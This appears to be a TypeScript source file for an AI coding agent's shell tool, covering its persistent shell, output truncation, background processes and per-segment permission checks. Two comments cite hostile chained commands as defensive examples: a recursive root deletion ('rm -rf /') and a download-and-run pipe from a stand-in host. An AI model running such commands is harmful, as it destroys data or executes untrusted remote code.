/**
 * The `bash` tool.
 *
 * The most powerful and most dangerous tool in the set. Everything here exists
 * because a naive `exec` is unusable for an agent:
 *
 *  - **Persistent shell.** Consecutive calls share a working directory and
 *    exported variables. Without this, `cd build && make` has to be one command
 *    forever, and `source .venv/bin/activate` is impossible.
 *  - **Output caps with head/tail retention.** A build that emits 200k lines
 *    must not blow the context window, and the useful parts are at both ends.
 *  - **Background processes.** `npm run dev` never exits. Running it in the
 *    foreground deadlocks the agent, so long-running commands get detached, get
 *    an id, and their output is readable later.
 *  - **Per-command permission with pattern learning.** Checked against the
 *    parsed command chain, not the raw string, so `ls && rm -rf /` cannot ride
 *    in on an approval for `ls`.
 *  - **Timeouts that kill the whole process group.** Killing only the shell
 *    leaves orphaned children holding ports.
 */

import { spawn, type ChildProcess } from "node:child_process"
import { existsSync, statSync } from "node:fs"
import { resolve } from "node:path"

import { s } from "../util/schema.js"
import { logger } from "../util/log.js"
import { newId } from "../util/id.js"
import { Bus, Events } from "../util/bus.js"
import { IS_WINDOWS } from "../global.js"
import { Flag } from "../flag.js"
import { defaultShell, splitCommandChain, commandTokens } from "../util/shell.js"
import { stripAnsi } from "../util/ansi.js"
import { assessRisk, suggestPattern } from "../permission/rules.js"
import { defineTool, fail, ok, type ToolContext, type ToolResult } from "./types.js"

const log = logger("tool.bash")

/* ------------------------------------------------------------------ */
/* Background process registry                                         */
/* ------------------------------------------------------------------ */

export interface BackgroundProcess {
  readonly id: string
  readonly command: string
  readonly cwd: string
  readonly startedAt: number
  readonly child: ChildProcess
  stdout: string[]
  stderr: string[]
  exitCode?: number
  signal?: string
  /** Total bytes seen, so we can report how much was dropped. */
  bytes: number
  finished: boolean
}

const background = new Map<string, BackgroundProcess>()

/** Maximum retained lines per stream for a background process. */
const BACKGROUND_LINE_CAP = 2_000

export function backgroundProcesses(): BackgroundProcess[] {
  return [...background.values()]
}

export function backgroundProcess(id: string): BackgroundProcess | undefined {
  return background.get(id)
}

/**
 * Kills a background process and everything it spawned.
 *
 * Negative pid targets the process group, which is the only way to reliably stop
 * a dev server that forked workers. On Windows there are no process groups, so
 * `taskkill /T` is the equivalent.
 */
export function killBackground(id: string, signal: NodeJS.Signals = "SIGTERM"): boolean {
  const entry = background.get(id)
  if (!entry || entry.finished) return false
  try {
    if (IS_WINDOWS) {
      spawn("taskkill", ["/pid", String(entry.child.pid), "/T", "/F"], { windowsHide: true })
    } else if (entry.child.pid) {
      process.kill(-entry.child.pid, signal)
    }
  } catch {
    try {
      entry.child.kill(signal)
    } catch {
      return false
    }
  }
  return true
}

/** Stops every background process. Called on shutdown. */
export function killAllBackground(): void {
  for (const id of background.keys()) killBackground(id, "SIGKILL")
  background.clear()
}

/* ------------------------------------------------------------------ */
/* Persistent shell                                                    */
/* ------------------------------------------------------------------ */

/**
 * A long-lived shell process per session.
 *
 * Commands are written to its stdin and a sentinel is echoed afterwards so we
 * know where the output ends and what the exit code was. This is how `cd` and
 * `export` persist between calls.
 *
 * The sentinel includes a random component so command output containing the
 * literal marker cannot terminate the read early.
 */
class PersistentShell {
  private child: ChildProcess | undefined
  private readonly cwd: string
  private readonly sessionId: string
  private buffer = ""
  private pending:
    | {
        marker: string
        resolve: (value: { stdout: string; exitCode: number; cwd: string }) => void
        reject: (error: Error) => void
        chunks: string[]
        timer: NodeJS.Timeout
        onChunk?: (chunk: string) => void
      }
    | undefined

  constructor(sessionId: string, cwd: string) {
    this.sessionId = sessionId
    this.cwd = cwd
  }

  private ensure(): ChildProcess {
    if (this.child && !this.child.killed && this.child.exitCode === null) return this.child

    const shell = defaultShell()
    const args = IS_WINDOWS ? [] : ["-i"]
    const child = spawn(shell, args, {
      cwd: this.cwd,
      env: {
        ...process.env,
        // Disable pagers and interactive prompts; an agent cannot answer them.
        PAGER: "cat",
        GIT_PAGER: "cat",
        LESS: "-FRX",
        TERM: "dumb",
        GIT_TERMINAL_PROMPT: "0",
        DEBIAN_FRONTEND: "noninteractive",
        NO_COLOR: "1",
        CI: process.env["CI"] ?? "",
        PRAXIS: "1",
      },
      stdio: ["pipe", "pipe", "pipe"],
      detached: !IS_WINDOWS,
      windowsHide: true,
    })

    child.stdout?.setEncoding("utf8")
    child.stderr?.setEncoding("utf8")
    child.stdout?.on("data", (chunk: string) => this.consume(chunk))
    child.stderr?.on("data", (chunk: string) => this.consume(chunk))
    child.on("exit", () => {
      if (this.pending) {
        clearTimeout(this.pending.timer)
        this.pending.reject(new Error("The shell exited unexpectedly."))
        this.pending = undefined
      }
      this.child = undefined
    })

    this.child = child
    return child
  }

  private consume(chunk: string): void {
    if (!this.pending) return
    this.buffer += chunk

    const markerIndex = this.buffer.indexOf(this.pending.marker)
    if (markerIndex === -1) {
      // Forward everything except a possible partial marker at the tail.
      const safeLength = Math.max(0, this.buffer.length - this.pending.marker.length)
      if (safeLength > 0) {
        const emitted = this.buffer.slice(0, safeLength)
        this.buffer = this.buffer.slice(safeLength)
        this.pending.chunks.push(emitted)
        this.pending.onChunk?.(emitted)
      }
      return
    }

    const before = this.buffer.slice(0, markerIndex)
    if (before) {
      this.pending.chunks.push(before)
      this.pending.onChunk?.(before)
    }

    const rest = this.buffer.slice(markerIndex + this.pending.marker.length)
    const newlineIndex = rest.indexOf("\n")
    if (newlineIndex === -1) {
      // The status line has not arrived yet.
      this.buffer = this.buffer.slice(markerIndex)
      return
    }

    const status = rest.slice(0, newlineIndex).trim()
    this.buffer = rest.slice(newlineIndex + 1)

    const [codePart, ...cwdParts] = status.split(" ")
    const exitCode = Number.parseInt(codePart ?? "0", 10)
    const cwd = cwdParts.join(" ") || this.cwd

    const entry = this.pending
    this.pending = undefined
    clearTimeout(entry.timer)
    entry.resolve({
      stdout: entry.chunks.join(""),
      exitCode: Number.isFinite(exitCode) ? exitCode : 0,
      cwd,
    })
  }

  async run(
    command: string,
    options: { timeoutMs: number; signal: AbortSignal; onChunk?: (chunk: string) => void },
  ): Promise<{ stdout: string; exitCode: number; cwd: string; timedOut: boolean }> {
    const child = this.ensure()
    if (this.pending) {
      throw new Error("The shell is already running a command for this session.")
    }

    const marker = `__praxis_${Math.random().toString(36).slice(2, 10)}__`

    return await new Promise((resolvePromise, rejectPromise) => {
      let timedOut = false

      const timer = setTimeout(() => {
        timedOut = true
        // Interrupt the foreground job without killing the shell itself, so the
        // session keeps its working directory and environment.
        try {
          if (!IS_WINDOWS && child.pid) process.kill(-child.pid, "SIGINT")
        } catch {
          // Best effort; the fallback below still resolves the call.
        }
        const entry = this.pending
        this.pending = undefined
        if (entry) {
          resolvePromise({
            stdout: entry.chunks.join(""),
            exitCode: 124,
            cwd: this.cwd,
            timedOut: true,
          })
        }
      }, options.timeoutMs)
      if (typeof timer.unref === "function") timer.unref()

      const onAbort = (): void => {
        try {
          if (!IS_WINDOWS && child.pid) process.kill(-child.pid, "SIGINT")
        } catch {
          // Ignored: the abort path resolves regardless.
        }
      }
      options.signal.addEventListener("abort", onAbort, { once: true })

      this.pending = {
        marker,
        chunks: [],
        timer,
        onChunk: options.onChunk,
        resolve: (value) => {
          options.signal.removeEventListener("abort", onAbort)
          resolvePromise({ ...value, timedOut })
        },
        reject: (error) => {
          options.signal.removeEventListener("abort", onAbort)
          rejectPromise(error)
        },
      }

      // `2>&1` merges stderr because a model reading a build failure needs both
      // interleaved in the order they happened.
      const script = IS_WINDOWS
        ? `${command}\r\necho ${marker} %ERRORLEVEL% %CD%\r\n`
        : `{ ${command} ; } 2>&1\nprintf '%s %s %s\\n' '${marker}' "$?" "$PWD"\n`
      child.stdin?.write(script)
    })
  }

  dispose(): void {
    if (!this.child) return
    try {
      if (!IS_WINDOWS && this.child.pid) process.kill(-this.child.pid, "SIGKILL")
      else this.child.kill("SIGKILL")
    } catch {
      // Already gone.
    }
    this.child = undefined
    log.debug("disposed shell", { sessionId: this.sessionId })
  }
}

const shells = new Map<string, PersistentShell>()

function shellFor(sessionId: string, cwd: string): PersistentShell {
  let shell = shells.get(sessionId)
  if (!shell) {
    shell = new PersistentShell(sessionId, cwd)
    shells.set(sessionId, shell)
  }
  return shell
}

export function disposeShell(sessionId: string): void {
  shells.get(sessionId)?.dispose()
  shells.delete(sessionId)
}

export function disposeAllShells(): void {
  for (const shell of shells.values()) shell.dispose()
  shells.clear()
}

/* ------------------------------------------------------------------ */
/* Output shaping                                                      */
/* ------------------------------------------------------------------ */

const DEFAULT_MAX_LINES = 1_000
const DEFAULT_MAX_BYTES = 120_000

interface ShapedOutput {
  readonly text: string
  readonly totalLines: number
  readonly truncated: boolean
}

/**
 * Caps command output while keeping the parts that carry information.
 *
 * The head holds the command's own banner and the first errors; the tail holds
 * the summary and the exit status. The middle of a long build log is repetition.
 */
function shapeOutput(raw: string, maxLines: number, maxBytes: number): ShapedOutput {
  const cleaned = stripAnsi(raw).replace(/\r\n/g, "\n").replace(/\r/g, "\n")
  const lines = cleaned.split("\n")
  while (lines.length > 0 && lines[lines.length - 1] === "") lines.pop()

  let text: string
  let truncated = false

  if (lines.length > maxLines) {
    const head = Math.floor(maxLines * 0.35)
    const tail = maxLines - head
    text = [
      ...lines.slice(0, head),
      "",
      `[\u2026 ${lines.length - maxLines} lines omitted \u2026]`,
      "",
      ...lines.slice(lines.length - tail),
    ].join("\n")
    truncated = true
  } else {
    text = lines.join("\n")
  }

  if (text.length > maxBytes) {
    const head = Math.floor(maxBytes * 0.4)
    const tail = maxBytes - head
    text = `${text.slice(0, head)}\n\n[\u2026 ${text.length - maxBytes} characters omitted \u2026]\n\n${text.slice(text.length - tail)}`
    truncated = true
  }

  return { text, totalLines: lines.length, truncated }
}

/* ------------------------------------------------------------------ */
/* Command analysis                                                    */
/* ------------------------------------------------------------------ */

/** Commands that never terminate and should be run in the background. */
const LONG_RUNNING = [
  /\b(npm|pnpm|yarn|bun)\s+(run\s+)?(dev|start|serve|watch|preview)\b/,
  /\bvite\b(?!.*build)/,
  /\bnext\s+dev\b/,
  /\bnuxt\s+dev\b/,
  /\bwebpack\s+(serve|--watch)\b/,
  /\btsc\s+.*--watch\b/,
  /\bnodemon\b/,
  /\bwatchexec\b/,
  /\bcargo\s+watch\b/,
  /\bair\b/,
  /\bflask\s+run\b/,
  /\buvicorn\b/,
  /\bgunicorn\b/,
  /\brails\s+s(erver)?\b/,
  /\bpython\s+-m\s+http\.server\b/,
  /\bdocker\s+compose\s+up\b(?!.*-d)/,
  /\bjest\s+--watch\b/,
  /\bvitest\b(?!.*run)/,
  /\bstorybook\b/,
  /\btail\s+-f\b/,
  /\bjournalctl\s+-f\b/,
]

export function looksLongRunning(command: string): boolean {
  return LONG_RUNNING.some((pattern) => pattern.test(command))
}

/** Commands that read a pager or wait for input, which would hang forever. */
const INTERACTIVE = [
  /^\s*(vim?|nvim|nano|emacs|pico)\b/,
  /^\s*(top|htop|btop)\b/,
  /^\s*less\b/,
  /^\s*more\b/,
  /^\s*man\b/,
  /^\s*(python|node|irb|psql|mysql|sqlite3|redis-cli)\s*$/,
  /^\s*ssh\s+[^-]/,
  /\bgit\s+(rebase\s+-i|add\s+-p|commit\s*$)/,
]

export function looksInteractive(command: string): string | undefined {
  for (const pattern of INTERACTIVE) {
    if (pattern.test(command)) {
      return "This command waits for interactive input, which is not available. Use a non-interactive form instead (for example add --no-pager, -y, or a file argument)."
    }
  }
  return undefined
}

/**
 * Rewrites commands that would otherwise hang or paginate.
 *
 * Cheap, invisible, and saves an enormous amount of wasted turns. `git log`
 * without `--no-pager` blocks on `less` in almost every environment.
 */
export function harden(command: string): string {
  let result = command
  result = result.replace(/\bgit\s+(?!--no-pager)(log|diff|show|branch|blame)\b/g, "git --no-pager $1")
  return result
}

/* ------------------------------------------------------------------ */
/* Tool definition                                                     */
/* ------------------------------------------------------------------ */

const parameters = s.object({
  command: s.string().describe("The shell command to run. Use && to chain, and quote paths that contain spaces."),
  description: s
    .string()
    .optional()
    .describe("A five-to-ten word description of what this command does, shown to the user."),
  timeout: s
    .number()
    .optional()
    .describe("Timeout in milliseconds. Defaults to 120000. Maximum 600000."),
  cwd: s.string().optional().describe("Working directory for this command. Defaults to the session directory."),
  background: s
    .boolean()
    .optional()
    .describe(
      "Run detached and return immediately with a process id. Use this for dev servers and watchers, which never exit.",
    ),
})

type BashInput = {
  command: string
  description?: string
  timeout?: number
  cwd?: string
  background?: boolean
}

const DESCRIPTION = `Run a shell command.

The shell is persistent within a session: your working directory and exported variables carry over between calls. Use that instead of prefixing every command with a long cd.

Use this tool for building, testing, running linters, git operations, and anything else a terminal does. Prefer dedicated tools where they exist: use grep instead of \`grep\`, glob instead of \`find\`, and read instead of \`cat\`, because they are faster and return structured results.

Rules:
- Quote paths that contain spaces.
- Chain related commands with && so a failure stops the chain.
- Never use interactive commands. There is no terminal to answer prompts. Add --yes, --no-pager, or a file argument as needed.
- For a process that does not exit (a dev server, a watcher), set background to true. You will get an id you can read output from and kill later. Running one in the foreground will simply time out.
- Output is capped. If you need to inspect a large amount of output, redirect it to a file and search that file.

Always set description to a short phrase like "run unit tests" or "install dependencies"; the user sees it while the command runs.`

export const bashTool = defineTool<BashInput>({
  id: "bash",
  action: "shell",
  concurrent: false,
  init: () => ({
    description: DESCRIPTION,
    parameters: parameters as never,
    execute: executeBash,
  }),
})

async function executeBash(input: BashInput, context: ToolContext): Promise<ToolResult> {
  const command = input.command.trim()
  if (command === "") {
    return fail("bash", "The command was empty.")
  }

  const interactive = looksInteractive(command)
  if (interactive) {
    return fail("bash", interactive)
  }

  const cwd = input.cwd ? resolve(context.cwd, input.cwd) : context.cwd
  if (input.cwd) {
    if (!existsSync(cwd) || !statSync(cwd).isDirectory()) {
      return fail("bash", `The directory ${input.cwd} does not exist.`)
    }
  }

  // Permission is checked per segment of the chain. A single approval for `ls`
  // must not authorise `ls && curl evil.sh | sh`.
  const segments = splitCommandChain(command)
  for (const segment of segments) {
    const risk = assessRisk("shell", segment)
    await context.requestPermission({
      action: "shell",
      resource: segment,
      title: input.description ?? summarizeCommand(segment),
      detail: segments.length > 1 ? `Full command:\n${command}` : undefined,
      pattern: suggestPattern("shell", segment, cwd),
      risk: risk === "critical" ? "high" : risk,
    })
  }

  const wantsBackground = input.background ?? false
  if (!wantsBackground && looksLongRunning(command)) {
    return fail(
      "bash",
      `\`${command}\` looks like a process that does not exit. Re-run it with background set to true, then use the output tool to read its logs.`,
    )
  }

  if (wantsBackground) {
    return startBackground(command, cwd, input.description, context)
  }

  const timeout = Math.min(
    Math.max(input.timeout ?? Flag.bashDefaultTimeoutMs() ?? 120_000, 1_000),
    600_000,
  )

  context.metadata({ title: input.description ?? summarizeCommand(command), command, cwd })

  const shell = shellFor(context.sessionId, cwd)
  const started = Date.now()

  let streamed = 0
  const result = await shell.run(harden(command), {
    timeoutMs: timeout,
    signal: context.signal,
    onChunk: (chunk) => {
      streamed += chunk.length
      context.stdout?.(chunk)
      // Keep the UI informed without flooding the event bus.
      if (streamed % 4_096 < chunk.length) {
        context.metadata({ bytes: streamed })
      }
    },
  })

  const durationMs = Date.now() - started
  const shaped = shapeOutput(result.stdout, DEFAULT_MAX_LINES, Flag.outputTokenMax() ?? DEFAULT_MAX_BYTES)

  context.metadata({
    exitCode: result.exitCode,
    durationMs,
    lines: shaped.totalLines,
    truncated: shaped.truncated,
  })

  if (result.timedOut) {
    return fail(
      `${summarizeCommand(command)} timed out`,
      [
        `The command did not finish within ${Math.round(timeout / 1000)}s and was interrupted.`,
        "",
        shaped.text || "(no output)",
        "",
        "If this command legitimately takes longer, raise the timeout. If it never exits, run it with background set to true.",
      ].join("\n"),
      { exitCode: 124, durationMs, timedOut: true },
    )
  }

  if (context.signal.aborted) {
    return fail(`${summarizeCommand(command)} interrupted`, "The user interrupted this command.")
  }

  const header: string[] = []
  if (result.cwd && result.cwd !== cwd) header.push(`Working directory is now ${result.cwd}`)
  if (shaped.truncated) {
    header.push(`Output truncated; ${shaped.totalLines} lines total.`)
  }

  const body = shaped.text === "" ? "(no output)" : shaped.text
  const output = header.length > 0 ? `${header.join("\n")}\n\n${body}` : body

  if (result.exitCode !== 0) {
    return fail(
      `${summarizeCommand(command)} \u2192 exit ${result.exitCode}`,
      `Exit code ${result.exitCode}.\n\n${output}`,
      { exitCode: result.exitCode, durationMs, lines: shaped.totalLines },
    )
  }

  return ok(summarizeCommand(command), output, {
    exitCode: 0,
    durationMs,
    lines: shaped.totalLines,
    truncated: shaped.truncated,
  })
}

/* ------------------------------------------------------------------ */
/* Background execution                                                */
/* ------------------------------------------------------------------ */

async function startBackground(
  command: string,
  cwd: string,
  description: string | undefined,
  context: ToolContext,
): Promise<ToolResult> {
  await context.requestPermission({
    action: "background_process",
    resource: command,
    title: description ?? `Start background process: ${summarizeCommand(command)}`,
    risk: "medium",
  })

  const id = newId("task")
  const shell = defaultShell()
  const args = IS_WINDOWS ? ["/d", "/s", "/c", command] : ["-c", command]

  const child = spawn(shell, args, {
    cwd,
    env: { ...process.env, TERM: "dumb", NO_COLOR: "1", PAGER: "cat", PRAXIS: "1" },
    stdio: ["ignore", "pipe", "pipe"],
    detached: !IS_WINDOWS,
    windowsHide: true,
  })

  const entry: BackgroundProcess = {
    id,
    command,
    cwd,
    startedAt: Date.now(),
    child,
    stdout: [],
    stderr: [],
    bytes: 0,
    finished: false,
  }
  background.set(id, entry)

  const append = (target: string[], chunk: string): void => {
    entry.bytes += chunk.length
    const lines = stripAnsi(chunk).split("\n")
    for (const line of lines) {
      if (line === "" && target.length > 0 && target[target.length - 1] === "") continue
      target.push(line)
    }
    // Ring-buffer semantics: a dev server left running for an hour must not grow
    // without bound.
    while (target.length > BACKGROUND_LINE_CAP) target.shift()
  }

  child.stdout?.setEncoding("utf8")
  child.stderr?.setEncoding("utf8")
  child.stdout?.on("data", (chunk: string) => append(entry.stdout, chunk))
  child.stderr?.on("data", (chunk: string) => append(entry.stderr, chunk))

  child.on("exit", (code, signal) => {
    entry.exitCode = code ?? undefined
    entry.signal = signal ?? undefined
    entry.finished = true
    Bus.publish(Events.backgroundProcessExited, {
      id,
      command,
      exitCode: code ?? undefined,
      signal: signal ?? undefined,
    })
    log.info("background process exited", { id, code, signal })
  })

  Bus.publish(Events.backgroundProcessStarted, { id, command, cwd, pid: child.pid })

  // Give it a moment so an immediate failure is reported now rather than later.
  await new Promise((resolvePromise) => {
    const timer = setTimeout(resolvePromise, 700)
    if (typeof timer.unref === "function") timer.unref()
  })

  if (entry.finished && (entry.exitCode ?? 0) !== 0) {
    const output = [...entry.stdout, ...entry.stderr].join("\n").trim()
    background.delete(id)
    return fail(
      `${summarizeCommand(command)} failed to start`,
      `The process exited immediately with code ${entry.exitCode}.\n\n${output || "(no output)"}`,
    )
  }

  const early = entry.stdout.slice(-20).join("\n").trim()

  context.metadata({ backgroundId: id, pid: child.pid })

  return ok(
    `${summarizeCommand(command)} (background ${id})`,
    [
      `Started in the background with id \`${id}\` (pid ${child.pid}).`,
      "",
      early ? `Early output:\n${early}` : "No output yet.",
      "",
      `Use the output tool with id \`${id}\` to read more, and the kill tool to stop it.`,
    ].join("\n"),
    { backgroundId: id, pid: child.pid },
  )
}

/* ------------------------------------------------------------------ */
/* Companion tools                                                     */
/* ------------------------------------------------------------------ */

const outputParameters = s.object({
  id: s.string().describe("The background process id returned by bash."),
  lines: s.number().optional().describe("How many trailing lines to return. Defaults to 200."),
  filter: s.string().optional().describe("Only return lines containing this substring."),
})

export const outputTool = defineTool<{ id: string; lines?: number; filter?: string }>({
  id: "output",
  action: "read",
  readOnly: true,
  concurrent: true,
  init: () => ({
    description: `Read the accumulated output of a background process started by bash.

Returns the most recent lines. Use this to check whether a dev server started, to watch a build, or to read the logs of a long-running task. The process keeps running.`,
    parameters: outputParameters as never,
    execute: async (input) => {
      const entry = background.get(input.id)
      if (!entry) {
        const available = [...background.keys()]
        return fail(
          "output",
          available.length > 0
            ? `No background process with id \`${input.id}\`. Running: ${available.join(", ")}.`
            : `No background process with id \`${input.id}\`, and none are running.`,
        )
      }

      const limit = Math.min(Math.max(input.lines ?? 200, 1), 2_000)
      let lines = [...entry.stdout, ...entry.stderr]
      if (input.filter) {
        const needle = input.filter.toLowerCase()
        lines = lines.filter((line) => line.toLowerCase().includes(needle))
      }
      const tail = lines.slice(-limit)

      const status = entry.finished
        ? `exited with code ${entry.exitCode ?? "unknown"}${entry.signal ? ` (signal ${entry.signal})` : ""}`
        : `running for ${Math.round((Date.now() - entry.startedAt) / 1000)}s`

      return ok(
        `${entry.command} (${status})`,
        [`Process \`${entry.id}\`: ${status}.`, "", tail.join("\n") || "(no output)"].join("\n"),
        { finished: entry.finished, exitCode: entry.exitCode, lines: lines.length },
      )
    },
  }),
})

const killParameters = s.object({
  id: s.string().describe("The background process id to stop."),
  signal: s.string().optional().describe("Signal to send. Defaults to SIGTERM."),
})

export const killTool = defineTool<{ id: string; signal?: string }>({
  id: "kill",
  action: "shell",
  init: () => ({
    description: `Stop a background process started by bash.

Kills the whole process group, so forked workers and child processes stop too. Always stop the processes you started once you no longer need them.`,
    parameters: killParameters as never,
    execute: async (input, context) => {
      const entry = background.get(input.id)
      if (!entry) return fail("kill", `No background process with id \`${input.id}\`.`)
      if (entry.finished) {
        return ok("kill", `Process \`${input.id}\` had already exited with code ${entry.exitCode ?? "unknown"}.`)
      }

      await context.requestPermission({
        action: "shell",
        resource: `kill ${entry.command}`,
        title: `Stop background process: ${summarizeCommand(entry.command)}`,
        risk: "low",
      })

      const signal = (input.signal ?? "SIGTERM") as NodeJS.Signals
      const killed = killBackground(input.id, signal)

      // Escalate if it ignores the polite request.
      if (killed) {
        await new Promise((resolvePromise) => {
          const timer = setTimeout(resolvePromise, 1_500)
          if (typeof timer.unref === "function") timer.unref()
        })
        if (!entry.finished) killBackground(input.id, "SIGKILL")
      }

      background.delete(input.id)
      return killed
        ? ok("kill", `Stopped \`${input.id}\` (${entry.command}).`)
        : fail("kill", `Could not stop \`${input.id}\`.`)
    },
  }),
})

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

/** A short label for the transcript: the command's first few tokens. */
export function summarizeCommand(command: string): string {
  const collapsed = command.replace(/\s+/g, " ").trim()
  if (collapsed.length <= 72) return collapsed
  const tokens = commandTokens(collapsed)
  const head = tokens.slice(0, 4).join(" ")
  return `${head.length > 72 ? head.slice(0, 69) : head}\u2026`
}
